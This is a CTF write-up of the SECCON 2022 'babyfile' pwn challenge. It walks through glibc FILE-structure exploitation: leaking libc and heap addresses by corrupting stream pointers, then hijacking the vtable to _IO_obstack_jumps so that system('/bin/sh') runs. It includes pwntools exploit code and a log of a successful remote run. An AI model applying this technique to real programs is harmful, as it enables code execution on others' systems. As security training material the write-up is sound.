---
title: "[SECCON 2022 - pwn] babyfile"
createdAT: 2022-10-10
description: "New way to gain code execution on modern glibc."
types: 'Writeups'
tags = ["pwn"]
---

# Introduction

babyfile is a file stream exploitation I did during the [SECCON CTF 2022 Quals](https://ctftime.org/event/1764) event. I didn’t succeed to flag it within the 24 hours :(. But anyway I hope this write up will be interesting to read given I show another way to gain code execution -- I have not seen before -- based on `_IO_obstack_jumps`! The related files can be found [here](https://github.com/ret2school/ctf/tree/master/2022/seccon/pwn/babyfile). If you're not familiar with file stream internals, I advice you to read my previous writeups about file stream exploitation, especially [this one](../catastrophe) and [this other one](../filestream).

{{< toc >}}

## TL;DR

- Populate base buffer with heap addresses with the help of `_IO_file_doallocate`.
- Make both input and output buffer equal to the base buffer with the help of `_IO_file_underflow`.
- Partial overwrite on right pointers to get a libc leak by simply flushing the file stream.
- Leak a heap address by printing a pointer stored within the main_arena.
- `_IO_obstack_overflow` ends up calling a function pointer stored within the file stream we have control over which leads to a call primitive (plus control over the first argument). Then I just called `system("/bin/sh\x00")`.

# What we have

The challenge is basically opening `/dev/null`, asking for an offset and a value to write at `fp + offset`. And we can freely flush `fp`. The source code is prodided:

{{< expand "Source code" "..." >}}
Source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static int menu(void);
static int getnline(char *buf, int size);
static int getint(void);

#define write_str(s) write(STDOUT_FILENO, s, sizeof(s)-1)

int main(void){
	FILE *fp;

	alarm(30);

	write_str("Play with FILE structure\n");

	if(!(fp = fopen("/dev/null", "r"))){
		write_str("Open error");
		return -1;
	}
	fp->_wide_data = NULL;

	for(;;){
		switch(menu()){
			case 0:
				goto END;
			case 1:
				fflush(fp);
				break;
			case 2:
				{
					unsigned char ofs;
					write_str("offset: ");
					if((ofs = getint()) & 0x80)
						ofs |= 0x40;
					write_str("value: ");
					((char*)fp)[ofs] = getint();
				}
				break;
		}
		write_str("Done.\n");
	}

END:
	write_str("Bye!");
	_exit(0);
}

static int menu(void){
	write_str("\nMENU\n"
			"1. Flush\n"
			"2. Trick\n"
			"0. Exit\n"
			"> ");

	return getint();
}

static int getnline(char *buf, int size){
	int len;

	if(size <= 0 || (len = read(STDIN_FILENO, buf, size-1)) <= 0)
		return -1;

	if(buf[len-1]=='\n')
		len--;
	buf[len] = '\0';

	return len;
}

static int getint(void){
	char buf[0x10] = {};

	getnline(buf, sizeof(buf));
	return atoi(buf);
}
```
{{</ expand >}}

# Exploitation ideas

I tried (in this order) to:

- Get a libc leak by calling `_IO_file_underflow` to make input and output buffers equal to the base buffer that contains with the help of `_IO_file_doallocate` a heap address. And then flushing the file stream to leak the libc. {{< emojify ":white_check_mark:" >}}
- Get a heap leak by leaking a heap pointer stored within the `main_arena`. {{< emojify ":white_check_mark:" >}}
- Get an arbitrary write with a tcache dup technique, I got `__free_hook` as the last pointer available in the target tcache bin but I didn't succeeded to get a shell >.<. {{< emojify ":x:" >}}
- Call primitive with control over the first argument by calling `_IO_obstack_overflow` (part of the `_IO_obstack_jumps` vtable). Then it allows us to call `system("/bin/sh\x00")`. {{< emojify ":white_check_mark:" >}}

## Libc leak

To get a libc leak we have to write on stdout a certain amount of bytes that leak a libc address. To do so we're looking for a way to make interesting pointers appear as the base buffer to then initialize both input and output buffer to the base buffer and then do a partial overwrite on these fields to point to an area that contains libc pointers. To get heap addresses within the base buffer we can misalign the vtable in such a way that `fp->vtable->sync()` calls `_IO_default_doallocate`. Then `_IO_default_doallocate` is called and does some operations:

The initial state of the file stream looks like this:

```
0x559c0955e2a0: 0x00000000fbad2488      0x0000000000000000
0x559c0955e2b0: 0x0000000000000000      0x0000000000000000
0x559c0955e2c0: 0x0000000000000000      0x0000000000000000
0x559c0955e2d0: 0x0000000000000000      0x0000000000000000
0x559c0955e2e0: 0x0000000000000000      0x0000000000000000
0x559c0955e2f0: 0x0000000000000000      0x0000000000000000
0x559c0955e300: 0x0000000000000000      0x00007f99db7c05c0
0x559c0955e310: 0x0000000000000003      0x0000000000000000
0x559c0955e320: 0x0000000000000000      0x0000559c0955e380
0x559c0955e330: 0xffffffffffffffff      0x0000000000000000
0x559c0955e340: 0x0000000000000000      0x0000000000000000
0x559c0955e350: 0x0000000000000000      0x0000000000000000
0x559c0955e360: 0x0000000000000000      0x0000000000000000
0x559c0955e370: 0x0000000000000000      0x00007f99db7bc4a8
0x559c0955e380: 0x0000000100000001      0x00007f99db7c6580
```

It initializes the base buffer to a fresh `BUFSIZE` allocated buffer.
{{< expand "_IO_default_doallocate" "..." >}}
```c
int
_IO_default_doallocate (FILE *fp)
{
  char *buf;

  buf = malloc(BUFSIZ);
  if (__glibc_unlikely (buf == NULL))
    return EOF;

  _IO_setb (fp, buf, buf+BUFSIZ, 1);
  return 1;
}
```
{{< /expand >}}

{{< expand "fp state after the _IO_default_doallocate" "..." >}}
```
0x559c0955e2a0: 0x00000000fbad2488      0x0000000000000000
0x559c0955e2b0: 0x0000000000000000      0x0000000000000000
0x559c0955e2c0: 0x0000000000000000      0x0000000000000000
0x559c0955e2d0: 0x0000000000000000      0x0000559c0955e480
0x559c0955e2e0: 0x0000559c09560480      0x0000000000000000
0x559c0955e2f0: 0x0000000000000000      0x0000000000000000
0x559c0955e300: 0x0000000000000000      0x00007f99db7c05c0
0x559c0955e310: 0x0000000000000003      0x0000000000000000
0x559c0955e320: 0x0000000000000000      0x0000559c0955e380
0x559c0955e330: 0xffffffffffffffff      0x0000000000000000
0x559c0955e340: 0x0000000000000000      0x0000000000000000
0x559c0955e350: 0x0000000000000000      0x0000000000000000
0x559c0955e360: 0x0000000000000000      0x0000000000000000
0x559c0955e370: 0x0000000000000000      0x00007f99db7bc4a8
0x559c0955e380: 0x0000000100000001      0x00007f99db7c6580
```
{{< /expand >}}

Once we have a valid pointer into the base buffer, we try to get into both the input and output buffer the base pointer.
Given the input / output buffer are `NULL` and that `fp->flags` is `0xfbad1800 | 0x8000` (plus `0x8000` => `_IO_USER_LOCK` to not stuck into `fflush`), we do not have issues with the checks. The issue with the `_IO_SYSREAD` call is described in the code below.
{{< expand "_IO_new_file_underflow" "..." >}}
```c
int
_IO_new_file_underflow (FILE *fp)
{
  ssize_t count;

  /* C99 requires EOF to be "sticky".  */
  if (fp->_flags & _IO_EOF_SEEN)
    return EOF;

  if (fp->_flags & _IO_NO_READS)
    {
      fp->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  if (fp->_IO_read_ptr < fp->_IO_read_end)
    return *(unsigned char *) fp->_IO_read_ptr;

  if (fp->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_IO_save_base != NULL)
	{
	  free (fp->_IO_save_base);
	  fp->_flags &= ~_IO_IN_BACKUP;
	}
      _IO_doallocbuf (fp);
    }

  /* FIXME This can/should be moved to genops ?? */
  if (fp->_flags & (_IO_LINE_BUF|_IO_UNBUFFERED))
    {
      /* We used to flush all line-buffered stream.  This really isn't
	 required by any standard.  My recollection is that
	 traditional Unix systems did this for stdout.  stderr better
	 not be line buffered.  So we do just that here
	 explicitly.  --drepper */
      _IO_acquire_lock (stdout);

      if ((stdout->_flags & (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))
	  == (_IO_LINKED | _IO_LINE_BUF))
	_IO_OVERFLOW (stdout, EOF);

      _IO_release_lock (stdout);
    }

  _IO_switch_to_get_mode (fp);

  /* This is very tricky. We have to adjust those
     pointers before we call _IO_SYSREAD () since
     we may longjump () out while waiting for
     input. Those pointers may be screwed up. H.J. */
  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
  fp->_IO_read_end = fp->_IO_buf_base;
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end
    = fp->_IO_buf_base;

  /* Given the vtable is misaligned, _IO_SYSREAD will call 
  _IO_default_pbackfail, the code is given after _IO_new_file_underflow */
  count = _IO_SYSREAD (fp, fp->_IO_buf_base,
		       fp->_IO_buf_end - fp->_IO_buf_base);


  if (count <= 0)
    {
      if (count == 0)
	fp->_flags |= _IO_EOF_SEEN;
      else
	fp->_flags |= _IO_ERR_SEEN, count = 0;
  }
  fp->_IO_read_end += count;
  if (count == 0)
    {
      /* If a stream is read to EOF, the calling application may switch active
	 handles.  As a result, our offset cache would no longer be valid, so
	 unset it.  */
      fp->_offset = _IO_pos_BAD;
      return EOF;
    }
  if (fp->_offset != _IO_pos_BAD)
    _IO_pos_adjust (fp->_offset, count);
  return *(unsigned char *) fp->_IO_read_ptr;
}
libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)
```
{{< /expand >}}

{{< expand "_IO_default_pbackfail" "..." >}}
```c
int
_IO_default_pbackfail (FILE *fp, int c)
{
  if (fp->_IO_read_ptr > fp->_IO_read_base && !_IO_in_backup (fp)
      && (unsigned char) fp->_IO_read_ptr[-1] == c)
    --fp->_IO_read_ptr;
  else
    {
      /* Need to handle a filebuf in write mode (switch to read mode). FIXME!*/
      if (!_IO_in_backup (fp))
	{
	  /* We need to keep the invariant that the main get area
	     logically follows the backup area.  */
	  if (fp->_IO_read_ptr > fp->_IO_read_base && _IO_have_backup (fp))
	    {
	      if (save_for_backup (fp, fp->_IO_read_ptr))
		return EOF;
	    }
	  else if (!_IO_have_backup (fp))
	    {
        // !! We should take this path cuz there is no save buffer plus we do not have the backup flag
	      /* No backup buffer: allocate one. */
	      /* Use nshort buffer, if unused? (probably not)  FIXME */
	      int backup_size = 128;
	      char *bbuf = (char *) malloc (backup_size);
	      if (bbuf == NULL)
		return EOF;
	      fp->_IO_save_base = bbuf;
	      fp->_IO_save_end = fp->_IO_save_base + backup_size;
	      fp->_IO_backup_base = fp->_IO_save_end;
	    }
	  fp->_IO_read_base = fp->_IO_read_ptr;
	  _IO_switch_to_backup_area (fp);
	}
      else if (fp->_IO_read_ptr <= fp->_IO_read_base)
	{
	  /* Increase size of existing backup buffer. */
	  size_t new_size;
	  size_t old_size = fp->_IO_read_end - fp->_IO_read_base;
	  char *new_buf;
	  new_size = 2 * old_size;
	  new_buf = (char *) malloc (new_size);
	  if (new_buf == NULL)
            return EOF;
	  memcpy (new_buf + (new_size - old_size), fp->_IO_read_base,
		  old_size);
	  free (fp->_IO_read_base);
	  _IO_setg (fp, new_buf, new_buf + (new_size - old_size),
		    new_buf + new_size);
	  fp->_IO_backup_base = fp->_IO_read_ptr;
	}

      *--fp->_IO_read_ptr = c;
    }
  return (unsigned char) c;
}
libc_hidden_def (_IO_default_pbackfail)
```
{{< /expand >}}


{{< expand "fp state after the _IO_new_file_underflow" "..." >}}
```
0x559c0955e2a0: 0x00000000fbad2588      0x0000559c0956050f
0x559c0955e2b0: 0x0000559c09560590      0x0000559c09560490
0x559c0955e2c0: 0x0000559c0955e480      0x0000559c0955e480
0x559c0955e2d0: 0x0000559c0955e480      0x0000559c0955e480
0x559c0955e2e0: 0x0000559c09560480      0x0000559c0955e480
0x559c0955e2f0: 0x0000559c09560510      0x0000559c0955e480
0x559c0955e300: 0x0000000000000000      0x00007f99db7c05c0
0x559c0955e310: 0x0000000000000003      0x0000000000000000
0x559c0955e320: 0x0000000000000000      0x0000559c0955e380
0x559c0955e330: 0xffffffffffffffff      0x0000000000000000
0x559c0955e340: 0x0000000000000000      0x0000000000000000
0x559c0955e350: 0x0000000000000000      0x0000000000000000
0x559c0955e360: 0x0000000000000000      0x0000000000000000
0x559c0955e370: 0x0000000000000000      0x00007f99db7bc460
0x559c0955e380: 0x0000000100000001      0x00007f99db7c6580
```
{{< /expand >}}

Once we have the pointers at the right place, we can simply do some partial overwrites to the portion of the heap that contains a libc pointer. Indeed by taking a look at the memory at `fp->_IO_base_buffer & ~0xff` (to avoid 4 bits bruteforce) we can that we can directly reach a libc pointer:
```
0x5649e8077400: 0x0000000000000000      0x0000000000000000
0x5649e8077410: 0x0000000000000000      0x0000000000000000
0x5649e8077420: 0x0000000000000000      0x0000000000000000
0x5649e8077430: 0x0000000000000000      0x0000000000000000
0x5649e8077440: 0x0000000000000000      0x0000000000000000
0x5649e8077450: 0x0000000000000000      0x0000000000000000
0x5649e8077460: 0x0000000000000000      0x0000000000000000
0x5649e8077470: 0x00007f4092dc3f60      0x0000000000002011
0x5649e8077480: 0x0000000000000000      0x0000000000000000
0x5649e8077490: 0x0000000000000000      0x0000000000000000
```

Then we have to actually doing the partial overwrite by corrupting certain pointers to leak this address with the help of `_IO_fflush`:
{{< expand "_IO_fflush" "..." >}}
```c
int
_IO_fflush (FILE *fp)
{
  if (fp == NULL)
    return _IO_flush_all ();
  else
    {
      int result;
      CHECK_FILE (fp, EOF);
      _IO_acquire_lock (fp);
      result = _IO_SYNC (fp) ? EOF : 0;
      _IO_release_lock (fp);
      return result;
    }
}
libc_hidden_def (_IO_fflush)
```
{{< /expand >}}

It ends up calling `_IO_new_file_sync(fp)`:
{{< expand "_IO_new_file_sync" "..." >}}
```c
int
_IO_new_file_sync (FILE *fp)
{
  ssize_t delta;
  int retval = 0;

  /*    char* ptr = cur_ptr(); */
  if (fp->_IO_write_ptr > fp->_IO_write_base)
    if (_IO_do_flush(fp)) return EOF;
  delta = fp->_IO_read_ptr - fp->_IO_read_end;
  if (delta != 0)
    {
      off64_t new_pos = _IO_SYSSEEK (fp, delta, 1);
      if (new_pos != (off64_t) EOF)
	fp->_IO_read_end = fp->_IO_read_ptr;
      else if (errno == ESPIPE)
	; /* Ignore error from unseekable devices. */
      else
	retval = EOF;
    }
  if (retval != EOF)
    fp->_offset = _IO_pos_BAD;
  /* FIXME: Cleanup - can this be shared? */
  /*    setg(base(), ptr, ptr); */
  return retval;
}
libc_hidden_ver (_IO_new_file_sync, _IO_file_sync)
```
{{< /expand >}}

I already talked about the way we can gain arbitrary read with FSOP attack on `stdout` in [this article](../catastrophe). The way we will get a leak is almost the same, first we need to trigger the first condition in `_IO_new_file_sync` in such a way that `fp->_IO_write_ptr > fp->_IO_write_base` will trigger `_IO_do_flush(fp)`. Then `_IO_do_flush` triggers the classic code path I dump right below. I will not comment all of it, the only thing you have to remind is that given most of the buffers are already initialized to a valid heap address beyond the target we do not have to rewrite them, this way we will significantly reduce the amount of partial overwrite.

{{< expand "_IO_do_flush" "..." >}}
```c
#define _IO_do_flush(_f) \
  ((_f)->_mode <= 0							      \
   ? _IO_do_write(_f, (_f)->_IO_write_base,				      \
		  (_f)->_IO_write_ptr-(_f)->_IO_write_base)		      \
   : _IO_wdo_write(_f, (_f)->_wide_data->_IO_write_base,		      \
		   ((_f)->_wide_data->_IO_write_ptr			      \
		    - (_f)->_wide_data->_IO_write_base)))
```
{{< /expand >}}

**Condition**: 
`(_f)->_IO_write_ptr-(_f)->_IO_write_base)` >= `sizeof(uint8_t* )`, `(_f)->_IO_write_base` == `target`.

{{< expand "_IO_do_write" "..." >}}
```c
int
_IO_new_do_write (FILE *fp, const char *data, size_t to_do)
{
  return (to_do == 0
	  || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
}
libc_hidden_ver (_IO_new_do_write, _IO_do_write)
```
{{< /expand >}}

{{< expand "new_do_write" "..." >}}
```c
static size_t
new_do_write (FILE *fp, const char *data, size_t to_do)
{
  size_t count;
  if (fp->_flags & _IO_IS_APPENDING)
    /* On a system without a proper O_APPEND implementation,
       you would need to sys_seek(0, SEEK_END) here, but is
       not needed nor desirable for Unix- or Posix-like systems.
       Instead, just indicate that offset (before and after) is
       unpredictable. */
    fp->_offset = _IO_pos_BAD;
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
      off64_t new_pos
	= _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
      if (new_pos == _IO_pos_BAD)
	return 0;
      fp->_offset = new_pos;
    }
  count = _IO_SYSWRITE (fp, data, to_do);
  if (fp->_cur_column && count)
    fp->_cur_column = _IO_adjust_column (fp->_cur_column - 1, data, count) + 1;
  _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_buf_base;
  fp->_IO_write_end = (fp->_mode <= 0
		       && (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
		       ? fp->_IO_buf_base : fp->_IO_buf_end);
  return count;
}
```
{{< /expand >}}

**Note**: Given `fp->_IO_read_end != fp->_IO_write_base`, `fp->_IO_read_end` is the save buffer that has been allocated and switched in `_IO_default_pbackfail` and that `_IO_write_base` contains the target memory area, we have to include the `_IO_IS_APPENDING` flag into `fp->_flags` to avoid the `_IO_SYSSEEK` which would fail and then return. Therefore we can finally reach the `_IO_SYSWRITE` that will leak the libc pointer.

The leak phase gives for me something like this:
```py
# do_allocate
partial_write(pwn.p8(0xa8), File.vtable)
fflush()

# _IO_file_underflow => _IO_default_pbackfail
partial_write(pwn.p8(0x60), File.vtable)
fflush()

write_ptr(pwn.p64(0xfbad1800 | 0x8000), File.flags)

partial_write(pwn.p8(0x70), File._IO_write_base)

partial_write(pwn.p8(0x78), File._IO_write_ptr)
partial_write(pwn.p8(0xa0), File.vtable)
write_ptr(pwn.p64(1), File.fileno)
fflush()

leak = pwn.u64(io.recv(8).ljust(8, b"\x00")) - 0x2160c0 + 0x2d160
pwn.log.info(f"libc: {hex(leak)}")
```

## Heap leak

To use the `_IO_obstack_jumps` technique, we have to craft a custom `obstack` structure on the heap (right on our filestream in fact) and thus we need to leak the heap to be able reference it. But given we already have a libc leak that's very easy, within the `main_arena` are stored some heap pointers, which means we just have to use the same `_IO_fflush` trick to flush the filestream and then leak a heap pointer stored in the `main_arena`. I wrote a function that leaks directly the right pointer from a given address:
```py
def leak_ptr(ptr: bytes) -> int:
    """
    We assume flags are right
    """

    write_ptr(ptr, File._IO_write_base)
    
    dest = (int.from_bytes(ptr, byteorder="little")+8).to_bytes(8, byteorder='little')

    write_ptr(dest, File._IO_write_ptr)

    fflush()
    ret = pwn.u64(io.recv(8).ljust(8, b"\x00"))

    return ret

"""
[...]
"""

leak_main_arena = leak + 0x1ed5a0

heap = leak_ptr(pwn.p64(leak_main_arena)) - 0x2a0
pwn.log.info(f"heap: {hex(heap)}")
```

## obstack exploitation

As far I know, `obstack` has never been used in CTF even though it can be leveraged as a very good call primitive (and as said before it needs a heap and libc to be used). Basically, the `_IO_obstack_jumps` vtable looks like this:
```c
/* the jump table.  */
const struct _IO_jump_t _IO_obstack_jumps libio_vtable attribute_hidden =
{
    JUMP_INIT_DUMMY,
    JUMP_INIT(finish, NULL),
    JUMP_INIT(overflow, _IO_obstack_overflow),
    JUMP_INIT(underflow, NULL),
    JUMP_INIT(uflow, NULL),
    JUMP_INIT(pbackfail, NULL),
    JUMP_INIT(xsputn, _IO_obstack_xsputn),
    JUMP_INIT(xsgetn, NULL),
    JUMP_INIT(seekoff, NULL),
    JUMP_INIT(seekpos, NULL),
    JUMP_INIT(setbuf, NULL),
    JUMP_INIT(sync, NULL),
    JUMP_INIT(doallocate, NULL),
    JUMP_INIT(read, NULL),
    JUMP_INIT(write, NULL),
    JUMP_INIT(seek, NULL),
    JUMP_INIT(close, NULL),
    JUMP_INIT(stat, NULL),
    JUMP_INIT(showmanyc, NULL),
    JUMP_INIT(imbue, NULL)
};
```

Given when `_IO_SYNC` is called in `_IO_fflush` the second argument is `0x1`, we cannot call functions like `_IO_obstack_xsputn` that need buffer as arguments, that's the reason why we have to dig into `_IO_obstack_overflow`.
```c
static int
_IO_obstack_overflow (FILE *fp, int c)
{
  struct obstack *obstack = ((struct _IO_obstack_file *) fp)->obstack;
  int size;

  /* Make room for another character.  This might as well allocate a
     new chunk a memory and moves the old contents over.  */
  assert (c != EOF);
  obstack_1grow (obstack, c);

  /* Setup the buffer pointers again.  */
  fp->_IO_write_base = obstack_base (obstack);
  fp->_IO_write_ptr = obstack_next_free (obstack);
  size = obstack_room (obstack);
  fp->_IO_write_end = fp->_IO_write_ptr + size;
  /* Now allocate the rest of the current chunk.  */
  obstack_blank_fast (obstack, size);

  return c;
}
```

The `struct _IO_obstack_file` is defined as follows:
{{< expand "struct _IO_obstack_file" "..." >}}
```c
struct _IO_obstack_file
{
  struct _IO_FILE_plus file;
  struct obstack *obstack;
};
```
{{< /expand >}}

Which means right after the `vtable` field within the file stream should be a pointer toward a `struct obstack`.

{{< expand "struct obstack" "..." >}}
```c
struct obstack          /* control current object in current chunk */
{
  long chunk_size;              /* preferred size to allocate chunks in */
  struct _obstack_chunk *chunk; /* address of current struct obstack_chunk */
  char *object_base;            /* address of object we are building */
  char *next_free;              /* where to add next char to current object */
  char *chunk_limit;            /* address of char after current chunk */
  union
  {
    PTR_INT_TYPE tempint;
    void *tempptr;
  } temp;                       /* Temporary for some macros.  */
  int alignment_mask;           /* Mask of alignment for each object. */
  /* These prototypes vary based on 'use_extra_arg', and we use
     casts to the prototypeless function type in all assignments,
     but having prototypes here quiets -Wstrict-prototypes.  */
  struct _obstack_chunk *(*chunkfun) (void *, long);
  void (*freefun) (void *, struct _obstack_chunk *);
  void *extra_arg;              /* first arg for chunk alloc/dealloc funcs */
  unsigned use_extra_arg : 1;     /* chunk alloc/dealloc funcs take extra arg */
  unsigned maybe_empty_object : 1; /* There is a possibility that the current
				      chunk contains a zero-length object.  This
				      prevents freeing the chunk if we allocate
				      a bigger chunk to replace it. */
  unsigned alloc_failed : 1;      /* No longer used, as we now call the failed
				     handler on error, but retained for binary
				     compatibility.  */
};
```
{{< /expand >}}

Once `obstack_1grow` is called, if `__o->next_free + 1 > __o->chunk_limit`, `_obstack_newchunk` gets called.

{{< expand "obstack_1grow" "..." >}}
```c
# define obstack_1grow(OBSTACK, datum)					      \
  __extension__								      \
    ({ struct obstack *__o = (OBSTACK);				      \
       if (__o->next_free + 1 > __o->chunk_limit)			      \
	 _obstack_newchunk (__o, 1);					      \
       obstack_1grow_fast (__o, datum);				      \
       (void) 0; })
```
{{< /expand >}}

**Condition**: `__o->next_free + 1 > __o->chunk_limit`.

{{< expand "_obstack_newchunk" "..." >}}
```c
/* Allocate a new current chunk for the obstack *H
   on the assumption that LENGTH bytes need to be added
   to the current object, or a new object of length LENGTH allocated.
   Copies any partial object from the end of the old chunk
   to the beginning of the new one.  */

void
_obstack_newchunk (struct obstack *h, int length)
{
  struct _obstack_chunk *old_chunk = h->chunk;
  struct _obstack_chunk *new_chunk;
  long new_size;
  long obj_size = h->next_free - h->object_base;
  long i;
  long already;
  char *object_base;

  /* Compute size for new chunk.  */
  new_size = (obj_size + length) + (obj_size >> 3) + h->alignment_mask + 100;
  if (new_size < h->chunk_size)
    new_size = h->chunk_size;

  /* Allocate and initialize the new chunk.  */
  new_chunk = CALL_CHUNKFUN (h, new_size);
  if (!new_chunk)
    (*obstack_alloc_failed_handler)();
  h->chunk = new_chunk;
  new_chunk->prev = old_chunk;
  new_chunk->limit = h->chunk_limit = (char *) new_chunk + new_size;

  /* Compute an aligned object_base in the new chunk */
  object_base =
    __PTR_ALIGN ((char *) new_chunk, new_chunk->contents, h->alignment_mask);

  /* Move the existing object to the new chunk.
     Word at a time is fast and is safe if the object
     is sufficiently aligned.  */
  if (h->alignment_mask + 1 >= DEFAULT_ALIGNMENT)
    {
      for (i = obj_size / sizeof (COPYING_UNIT) - 1;
	   i >= 0; i--)
	((COPYING_UNIT *) object_base)[i]
	  = ((COPYING_UNIT *) h->object_base)[i];
      /* We used to copy the odd few remaining bytes as one extra COPYING_UNIT,
	 but that can cross a page boundary on a machine
	 which does not do strict alignment for COPYING_UNITS.  */
      already = obj_size / sizeof (COPYING_UNIT) * sizeof (COPYING_UNIT);
    }
  else
    already = 0;
  /* Copy remaining bytes one by one.  */
  for (i = already; i < obj_size; i++)
    object_base[i] = h->object_base[i];

  /* If the object just copied was the only data in OLD_CHUNK,
     free that chunk and remove it from the chain.
     But not if that chunk might contain an empty object.  */
  if (!h->maybe_empty_object
      && (h->object_base
	  == __PTR_ALIGN ((char *) old_chunk, old_chunk->contents,
			  h->alignment_mask)))
    {
      new_chunk->prev = old_chunk->prev;
      CALL_FREEFUN (h, old_chunk);
    }

  h->object_base = object_base;
  h->next_free = h->object_base + obj_size;
  /* The new chunk certainly contains no empty object yet.  */
  h->maybe_empty_object = 0;
}
# ifdef _LIBC
libc_hidden_def (_obstack_newchunk)
# endif
```
{{< /expand >}}

The interesting part of the function is the call to the `CALL_CHUNKFUN` macro that calls a raw *unencrypted* function pointer referenced by the `obstack` structure with either a controlled argument (`(h)->extra_arg`) or only with the size.

{{< expand "CALL_FREEFUN" "..." >}}
```c
# define CALL_FREEFUN(h, old_chunk) \
  do { \
      if ((h)->use_extra_arg)						      \
	(*(h)->freefun)((h)->extra_arg, (old_chunk));			      \
      else								      \
	(*(void (*)(void *))(h)->freefun)((old_chunk));		      \
    } while (0)
```
{{< /expand >}}

If I summarize, to call `system("/bin/sh"` we need to have:
- `__o->next_free + 1 > __o->chunk_limit`
- `(h)->freefun` = `&system`
- `(h)->extra_arg` = `&"/bin/sh"`
- `(h)->use_extra_arg` != 0

Which gives:
```py
_IO_obstack_jumps = leak + 0x1E9260
pwn.log.info(f"_IO_obstack_jumps: {hex(_IO_obstack_jumps)}")

# edit vtable => _IO_obstack_jumps
write_ptr(pwn.p64(_IO_obstack_jumps - 8 * 9), File.vtable)
write_ptr(pwn.p64(heap + 0x2a0), File.obstack)

partial_write(pwn.p8(0xff), File._IO_read_base)

write_ptr(pwn.p64(libc.sym.system), obstack.chunkfun) # fn ptr, system
write_ptr(pwn.p64(next(libc.search(b'/bin/sh'))), obstack.extra_arg) # arg
partial_write(pwn.p8(True), obstack.use_extra_arg)

fflush()
# system("/bin/sh")
```

# PROFIT

After optimizing a lot my exploit (my french connection sucks), here we are:
```bash
nasm@off:~/Documents/pwn/seccon/babyfile$ time python3 exploit.py REMOTE HOST=babyfile.seccon.games PORT=3157
[*] '/home/nasm/Documents/pwn/seccon/babyfile/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/nasm/Documents/pwn/seccon/babyfile/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to babyfile.seccon.games on port 3157: Done
[*] libc: 0x7fe2bc538000
[*] heap: 0x55fd27776000
[*] _IO_obstack_jumps: 0x7fe2bc721260
[*] Switching to interactive mode
SECCON{r34d_4nd_wr173_4nywh3r3_w17h_f1l3_57ruc7ur3}
[*] Got EOF while reading in interactive
$
```

# Annexes

{{< expand "Full exploit code" "..." >}}
Final exploit:
```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfmate

import os
import time
import pwn


# Set up pwntools for the correct architecture
exe = pwn.context.binary = pwn.ELF('chall')
libc = pwn.context.binary = pwn.ELF('libc-2.31.so')
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False
# pwn.context.timeout = 1000

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


gdbscript = '''
source /home/nasm/Downloads/pwndbg/gdbinit.py
'''.format(**locals())

io = None
io = start()

class File:
    flags          = 0x0
    _IO_read_base  = 24
    _IO_read_end   = 0x10
    _IO_write_base = 0x20
    _IO_write_ptr  = 0x28
    _IO_write_end  = 0x30
    _IO_buf_base   = 0x38
    _IO_buf_end    = 0x40
    fileno         = 0x70
    vtable         = 0xd8
    obstack       = 0xe0

class obstack:
    chunkfun       = 56
    extra_arg      = 56+16
    use_extra_arg  = 56+16+8

def fflush():
    io.sendlineafter(b"> ", b"1")

def trick(offt, data):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"offset: ", str(offt).encode())
    io.sendlineafter(b"value: ", data)

def leave():
    io.sendlineafter(b"> ", b"0")

def write_ptr(ptr: bytes, offt: int, debug=True):
    for i in range(8):
        if ptr[i]:
            trick(offt + i, str(ptr[i]).encode())

def partial_write2(ptr: bytes, offt: int):
    for i in range(2):
        trick(offt + i, str(ptr[i]).encode())

def partial_write(ptr: bytes, offt: int):
    for i in range(1):
        trick(offt + i, str(ptr[i]).encode())

def leak_ptr(ptr: bytes) -> int:
    write_ptr(ptr, File._IO_write_base)
    
    dest = (int.from_bytes(ptr, byteorder="little")+8).to_bytes(8, byteorder='little')

    write_ptr(dest, File._IO_write_ptr)

    fflush()
    ret = pwn.u64(io.recv(8).ljust(8, b"\x00"))

    return ret

def main():
    # do_allocate
    partial_write(pwn.p8(0xa8), File.vtable)
    fflush()

    # _IO_file_underflow => _IO_default_pbackfail
    partial_write(pwn.p8(0x60), File.vtable)
    fflush()

    """
    int
    _IO_default_pbackfail (FILE *fp, int c)
    => not _IO_IN_BACKUP         0x0100
    => _IO_read_base == _IO_write_ptr
    => _IO_read_end == _IO_write_ptr + 8
    => _IO_write_end = right size
    """

    write_ptr(pwn.p64(0xfbad1800 | 0x8000), File.flags)

    partial_write(pwn.p8(0x70), File._IO_write_base)

    partial_write(pwn.p8(0x78), File._IO_write_ptr)
    partial_write(pwn.p8(0xa0), File.vtable)
    write_ptr(pwn.p64(1), File.fileno)
    fflush()

